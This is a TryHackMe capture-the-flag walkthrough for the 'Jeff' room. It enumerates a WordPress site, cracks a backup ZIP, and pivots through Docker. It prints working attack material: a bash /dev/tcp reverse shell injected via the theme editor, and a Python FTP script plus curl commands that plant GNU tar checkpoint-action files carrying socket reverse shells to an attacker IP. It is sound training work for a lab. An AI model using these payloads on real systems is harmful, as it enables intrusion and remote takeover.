# Jeff — TryHackMe Walkthrough

> Can you hack Jeff's web server? This room challenges you to enumerate a WordPress installation, crack a password-protected archive, extract credentials, pivot through a Docker container via an FTP tar checkpoint exploit, and escalate to root.


<p align="center">
  <a href="https://tryhackme.com/room/jeff"><img src="https://img.shields.io/badge/TryHackMe-Jeff-red?style=for-the-badge&logo=tryhackme" alt="TryHackMe - Jeff"></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty: Medium">
  <img src="https://img.shields.io/badge/Platform-Linux-lightgrey?style=for-the-badge&logo=linux" alt="Platform: Linux">
  <img src="https://img.shields.io/badge/Focus-Web%20%7C%20WordPress%20%7C%20FTP%20Exploit-blue?style=for-the-badge" alt="Focus: Web, WordPress, FTP Exploit">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Nmap port and service enumeration |
| 2 | Gobuster directory and vhost enumeration |
| 3 | Password-protected ZIP cracking with zip2john and John the Ripper |
| 4 | WordPress enumeration with WPScan |
| 5 | WordPress theme editor reverse shell injection |
| 6 | Credential harvesting from PHP source files |
| 7 | FTP tar checkpoint privilege escalation |
| 8 | Docker container pivot |
| 9 | Reading user and root flags |

---

## Learning Objectives

- Enumerate open ports and running services with Nmap and identify an nginx-fronted WordPress site
- Use Gobuster to discover hidden directories and virtual hosts
- Crack a password-protected ZIP archive and recover credentials from its contents
- Enumerate WordPress users and authenticate to the admin panel
- Inject a PHP reverse shell via the WordPress theme editor
- Read PHP source code to extract FTP credentials stored in a backup script
- Exploit GNU tar's `--checkpoint-action` feature over FTP to execute a shell as a different user inside a Docker container
- Escalate to root and retrieve both flags

---

## Prerequisites

- Nmap, Gobuster, WPScan, John the Ripper, zip2john, Python 3.7, curl, netcat
- Add the following entries to `/etc/hosts` before starting:
  ```
  Machine_IP    jeff.thm
  Machine_IP    wordpress.jeff.thm
  ```

---

## [Task 1] — Get Root

### Step 1 — Nmap Service Scan

**Approach:** Run an aggressive Nmap scan with service version detection, default scripts, and OS fingerprinting to identify what is exposed on the target. Two ports are all you need to work with here.

```
$ sudo nmap -A -sS -sC -sV -Pn -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 13:12 CEST
Nmap scan report for Machine_IP
Host is up (0.035s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   35.69 ms 10.8.0.1
2   35.54 ms Machine_IP
```

> **Note:** Only SSH (22) and HTTP (80) are open. The web server is nginx, not Apache, which is common in Docker-backed setups. SSH is a dead end for now — the room hint explicitly says brute-forcing it is the wrong path. All initial effort should be directed at port 80.

---

### Step 2 — Gobuster Directory Enumeration on jeff.thm

**Approach:** Run Gobuster in directory mode against the root of `http://jeff.thm` to map out the site structure before touching anything manually.

```
$ gobuster dir -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://jeff.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
2020/10/17 13:14:30 Starting gobuster
===============================================================
/admin    (Status: 301)
/assets   (Status: 301)
/backups  (Status: 301)
/index.html (Status: 200)
/uploads  (Status: 301)
===============================================================
2020/10/17 13:14:47 Finished
===============================================================
```

> **Note:** Four redirecting directories are found. `/backups` is immediately interesting — backup directories commonly contain forgotten archives or credential files. `/admin` is also worth probing for a login panel.

---

### Step 3 — Gobuster Enumeration of /admin and /backups

**Approach:** Re-run Gobuster against both interesting subdirectories, adding common file extensions (`.zip`, `.bak`, `.old`, `.php`) to catch backup files and scripts that plain directory scanning would miss.

```
$ gobuster dir -u http://jeff.thm/admin/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt
===============================================================
/index.html (Status: 200)
/login.php  (Status: 200)
===============================================================
```

```
$ gobuster dir -u http://jeff.thm/backups/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt
===============================================================
/backup.zip  (Status: 200)
/index.html  (Status: 200)
===============================================================
```

> **Note:** `/admin/login.php` confirms there is an admin panel. More valuably, `/backups/backup.zip` is a directly downloadable archive. Download it with `wget http://jeff.thm/backups/backup.zip` before proceeding.

---

### Step 4 — Crack the ZIP Archive

**Approach:** Inspect the archive contents with `zipinfo`, then extract a crackable hash with `zip2john` and feed it to John the Ripper against the rockyou wordlist. The archive is partially encrypted, so John will target the encrypted files within it.

```
$ zipinfo backup.zip
Archive:  backup.zip
Zip file size: 62753 bytes, number of entries: 9
drwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/
drwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/assets/
-rwxrwx---  3.0 unx    34858 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.css
-rwxrwx---  3.0 unx    49963 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.js
-rwxrwx---  3.0 unx    89614 TX defN 20-May-14 17:20 backup/assets/MooTools-Core-1.6.0-compressed.js
-rwxrwx---  3.0 unx    11524 BX defN 20-May-14 17:20 backup/assets/profile.jpg
-rwxrwx---  3.0 unx     1439 TX defN 20-May-14 17:20 backup/assets/style.css
-rwxrwx---  3.0 unx     1178 TX defN 20-May-14 17:20 backup/index.html
-rwxrwx---  3.0 unx       41 TX stor 20-May-14 17:20 backup/wpadmin.bak
```

```
$ zip2john backup.zip > backup.hash
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.css PKZIP Encr: 2b chk, TS_chk, cmplen=6483, decmplen=34858, crc=541FD3B0
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.js PKZIP Encr: 2b chk, TS_chk, cmplen=14499, decmplen=49963, crc=545D786A
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/MooTools-Core-1.6.0-compressed.js PKZIP Encr: 2b chk, TS_chk, cmplen=27902, decmplen=89614, crc=43D2FC37
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/profile.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=10771, decmplen=11524, crc=F052E57A
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=675, decmplen=1439, crc=9BA0C7C1
ver 2.0 efh 5455 efh 7875 backup.zip/backup/index.html PKZIP Encr: 2b chk, TS_chk, cmplen=652, decmplen=1178, crc=FAECFEFB
ver 1.0 efh 5455 efh 7875 backup.zip/backup/wpadmin.bak PKZIP Encr: 2b chk, TS_chk, cmplen=53, decmplen=41, crc=FAECFEFB
```

```
$ john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!Burningbird!!  (backup.zip)
1g 0:00:00:04 DONE (2020-10-17 13:21) 0.2036g/s 2920Kp/s 2920Kc/s 2920KC/s
Session completed
```

> **Note:** John cracks the ZIP password in under five seconds against rockyou. Now extract the archive using `unzip -P '!!Burningbird!!' backup.zip`. The most interesting file inside is `backup/wpadmin.bak`.

---

### Step 5 — Read the WordPress Credential Backup

**Approach:** Cat the backup file recovered from the archive to obtain the WordPress admin password.

```
$ cat backup/wpadmin.bak
wordpress password is: phO#g)C5dhIWZn3BKP
```

> **Note:** This is a plaintext credential backup — a classic developer mistake. The password belongs to the WordPress admin account, but the WordPress installation itself has not been found yet. The next step is to locate it via virtual host enumeration.

---

### Step 6 — Gobuster Virtual Host Enumeration

**Approach:** Run Gobuster in vhost mode to discover subdomains served by the same nginx instance. A WordPress site may be hosted on a virtual host that isn't reachable by browsing the main domain.

```
$ gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:          http://jeff.thm
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
===============================================================
2020/10/17 13:23:32 Starting gobuster
===============================================================
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
===============================================================
2020/10/17 13:23:51 Finished
===============================================================
```

> **Note:** `wordpress.jeff.thm` is a live virtual host. Add it to `/etc/hosts` (`Machine_IP wordpress.jeff.thm`) so your browser and tools can resolve it. Virtual hosting like this is common when the same server runs multiple sites — without this entry, requests would return the default nginx page.

---

### Step 7 — WordPress Enumeration with WPScan

**Approach:** Run WPScan against the discovered WordPress vhost to identify the WordPress version, installed themes, plugins, and — most importantly — valid usernames. The `-e u` flag specifically targets user enumeration.

```
$ wpscan --url http://wordpress.jeff.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
_______________________________________________________________

[+] URL: http://wordpress.jeff.thm/ [Machine_IP]
[+] Started: Sat Oct 17 13:25:32 2020

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).

[+] WordPress theme in use: twentytwenty
 | Version: 1.2 (80% confidence)

[+] XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php

[+] Enumerating Users (via Passive and Aggressive Methods)

[i] User(s) Identified:

[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Finished: Sat Oct 17 13:25:42 2020
```

> **Note:** WPScan confirms a single user: `jeff`. WordPress 5.4.1 is outdated, and XML-RPC is enabled — a common attack surface. Combined with the password recovered from the backup archive, you now have valid admin credentials: `jeff` / `phO#g)C5dhIWZn3BKP`. Log in at `http://wordpress.jeff.thm/wp-admin`.

---

### Step 8 — Reverse Shell via WordPress Theme Editor

**Approach:** Authenticated WordPress admins can edit theme PHP files directly from the dashboard under Appearance → Theme Editor. Inject a PHP reverse shell payload into a theme file (such as `404.php` in the active Twenty Twenty theme), set up a netcat listener on port 9001, then trigger the file by browsing to it.

The payload injected into the theme file:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'");
```

Start the listener before saving the file:

```
$ nc -lvnp 9001
```

> **Note:** This technique abuses the fact that WordPress theme files are executable PHP. When the page is requested, the web server runs the injected code as the `www-data` user, connecting back to your listener. This gives you an initial foothold inside the WordPress container. Stabilise the shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'` after catching it.

---

### Step 9 — Discover the FTP Backup Script

**Approach:** Once inside as `www-data`, list the web root to look for non-standard files. A PHP file called `ftp_backup.php` stands out — read it to recover the next set of credentials.

```
www-data@Jeff:/var/www/html$ ls -la
total 228
drwxr-xr-x  5 www-data www-data  4096 Oct 17 11:12 .
drwxr-xr-x  1 root     root      4096 Apr 23 16:34 ..
-rw-r--r--  1 www-data www-data   261 May 14 16:54 .htaccess
-rw-r--r--  1 root     root       575 May 18 11:57 ftp_backup.php
-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
-rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
-rw-r--r--  1 www-data www-data  7278 Jan 10  2020 readme.html
drwxr-xr-x  9 www-data www-data  4096 Apr 29 18:58 wp-admin
drwxr-xr-x  4 www-data www-data  4096 Oct 17 11:29 wp-content
drwxr-xr-x 21 www-data www-data 12288 Apr 29 18:58 wp-includes
-rw-r--r--  1 www-data www-data  2823 Oct 17 11:12 wp-config-sample.php
-rw-r--r--  1 www-data www-data  3198 Oct 17 11:12 wp-config.php
[... standard WordPress files omitted ...]
```

```
www-data@Jeff:/var/www/html$ cat ftp_backup.php
```

```php
<?php
/*
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id);
```

> **Note:** This unfinished script reveals plaintext FTP credentials for a `backupmgr` account connecting to `172.20.0.1` — the Docker host gateway, meaning there is another machine (or container) reachable on the internal network. The script was never completed but the credentials are live. This is a classic case of secrets left in source code.

---

### Step 10 — FTP Tar Checkpoint Exploit (Python Script Method)

**Approach:** The FTP server at `172.20.0.1` accepts the `backupmgr` credentials and exposes a `files/` directory. GNU tar's `--checkpoint-action` feature executes a shell command when tar processes a file with that exact filename. By uploading a reverse shell script alongside two specially named zero-byte files (`--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`), any tar archiving job running against that directory will execute your shell.

Transfer the following Python script to the target via a Python HTTP server on your machine, then execute it from `/tmp`:

```python
#!/usr/bin/env python3.7
from ftplib import FTP
import io

host = '172.20.0.1'
username = "backupmgr"
password = "SuperS1ckP4ssw0rd123!"

ftp = FTP(host = host)
login_status = ftp.login(user = username, passwd = password)
print(login_status)
ftp.set_pasv(False)
ftp.cwd('files')
print(ftp.dir())

shell = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
trash = io.BytesIO(b'')

ftp.storlines('STOR shell.sh', shell)
ftp.storlines('STOR --checkpoint=1', trash)
ftp.storlines('STOR --checkpoint-action=exec=sh shell.sh', trash)
ftp.dir()

ftp.quit()
```

```
www-data@Jeff:/tmp$ wget YOUR_IP/shell.py
--2020-10-17 12:01:19--  http://YOUR_IP/shell.py
Connecting to YOUR_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 739 [text/plain]
Saving to: 'shell.py'

     0K                                                       100% 6.69M=0s

2020-10-17 12:01:19 (6.69 MB/s) - 'shell.py' saved [739/739]

www-data@Jeff:/tmp$ chmod +x shell.py
www-data@Jeff:/tmp$ python3.7 shell.py
230 Login successful.
-rwxr-xr-x    1 1001     1001            0 Oct 17 12:01 --checkpoint-action=exec=sh shell.sh
-rwxr-xr-x    1 1001     1001            0 Oct 17 12:01 --checkpoint=1
-rwxr-xr-x    1 1001     1001          228 Oct 17 12:01 shell.sh
None
```

> **Note:** The three files are now sitting in the FTP server's `files/` directory. When the server-side cron job or backup script runs `tar` against that directory, tar reads the filenames as command-line flags and executes `shell.sh`. Have a netcat listener ready on port 9002 (`nc -lvnp 9002`) before running the script. This technique is documented extensively and is an excellent example of why you should never run tar against untrusted directories.

---

### Step 11 — FTP Tar Checkpoint Exploit (curl Manual Method)

**Approach:** An alternative to the Python script is to construct the same three files directly on the compromised host using shell redirections and upload them with curl's built-in FTP support. This approach requires no Python and works with any shell.

```
$ echo "python3.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh
$ echo "" > "/tmp/--checkpoint=1"
$ echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"

$ curl -v -P - -T "/tmp/shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
$ curl -v -P - -T "/tmp/--checkpoint=1" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
$ curl -v -P - -T "/tmp/--checkpoint-action=exec=sh shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
```

> **Note:** The `-P -` flag tells curl to use active FTP mode through the current interface rather than passive, which is necessary to upload from behind NAT. The filenames with leading dashes must be quoted or prefixed carefully to prevent the shell from interpreting them as flags. Once all three files are uploaded, wait for the tar cron to fire — your listener on port 5555 will receive the callback. You can verify existing uploads first with: `curl -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' -s`

---

### Task 1.1 — Hack the machine and obtain the user.txt flag.

> **Note:** After landing a shell as `backupmgr` (or the user running the tar cron job on the container host), navigate to the home directory or other readable locations to find `user.txt`.

<details>
<summary>Reveal Answer</summary>

Obtain this flag by reading `user.txt` from the appropriate user's home directory after establishing the shell via the tar checkpoint exploit.

</details>

---

### Task 1.2 — Escalate your privileges. What is the root flag?

> **Note:** With a shell on the inner container, enumerate sudo rights, SUID binaries, and readable files belonging to root. Standard Linux privilege escalation methodology applies here — check `sudo -l`, look for writable cron jobs, and inspect running processes.

<details>
<summary>Reveal Answer</summary>

Obtain this flag by reading `root.txt` from `/root/` after successfully escalating privileges on the target system.

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan of Machine_IP | Two open ports found: SSH (22) and HTTP (80) running nginx |
| 2 | Gobuster directory scan on jeff.thm | Discovered `/admin`, `/backups`, `/assets`, and `/uploads` |
| 3 | Gobuster scan of /admin and /backups with file extensions | Found `/admin/login.php` and `/backups/backup.zip` |
| 4 | zip2john + John the Ripper against backup.zip | ZIP password cracked; archive extracted |
| 5 | Read backup/wpadmin.bak | WordPress admin password recovered in plaintext |
| 6 | Gobuster vhost scan on jeff.thm | Discovered `wordpress.jeff.thm` virtual host |
| 7 | WPScan against wordpress.jeff.thm | WordPress 5.4.1 identified; username `jeff` confirmed |
| 8 | PHP reverse shell injected via WordPress theme editor | Shell obtained as `www-data` inside the WordPress container |
| 9 | Read ftp_backup.php in the web root | FTP credentials for `backupmgr` at `172.20.0.1` recovered |
| 10 | Tar checkpoint exploit via Python FTP script | Shell payload and trigger files uploaded to FTP server |
| 11 | Tar checkpoint exploit via curl (alternative method) | Same payload delivered using only shell commands and curl |
| 12 | Read user.txt | User flag captured |
| 13 | Privilege escalation on container host | Root flag captured |
